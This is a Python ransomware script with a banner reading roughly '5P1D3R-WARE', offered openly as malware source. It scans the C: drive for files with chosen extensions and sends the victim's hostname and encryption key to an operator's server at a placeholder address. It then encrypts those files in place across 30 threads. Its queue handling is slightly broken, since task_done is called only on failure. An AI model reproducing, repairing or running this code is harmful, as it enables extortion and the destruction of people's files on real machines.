import os
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
from cryptography.fernet import Fernet
from termcolor import colored


name ='''
 ____  ____  _ ____ _____ ____    __        ___    ____  _____ 
| ___||  _ \/ |  _ \___ /|  _ \   \ \      / / \  |  _ \| ____|
|___ \| |_) | | | | ||_ \| |_) |___\ \ /\ / / _ \ | |_) |  _|  
 ___) |  __/| | |_| |__) |  _ <_____\ V  V / ___ \|  _ <| |___ 
|____/|_|   |_|____/____/|_| \_\     \_/\_/_/   \_\_| \_\_____|
                                                            '''
print(colored(name, "red"))

# Encrypted extensions
encrypted_ext = () # enter extension(s) of files to be encrypted in the bracket separate with ,

# Grab all files from the machine
file_paths = []

for root, dirs, files in os.walk('C:'):
    for file in files:
        if file.endswith(encrypted_ext):
            file_paths.append(os.path.join(root, file))
for f in file_paths:
    print(f)
print('successfully located all files')

key = Fernet.generate_key()

hostname = socket.gethostname()
print(hostname)

# connect to the ransomware server and send hostname and key
ipaddress = '127.0.0.1'# change to ip address of server
port = 8001
date = datetime.now()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ipaddress, port))
    s.send(f'[{date}]--{hostname}--{key}'.encode('utf-8'))


# encrypting files


def encrypt(key):
    while not q.empty():
        try:
            file_ = q.get()
            cipher = Fernet(key)
            with open(file_, 'rb') as original_file:
                original_data = original_file.read()

                encrypted_data = cipher.encrypt(original_data)

            with open(file_, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
                print(f'{file_} encrypted successfully!')

        except:
            print(f'failed to encrypt {file_}')
            q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
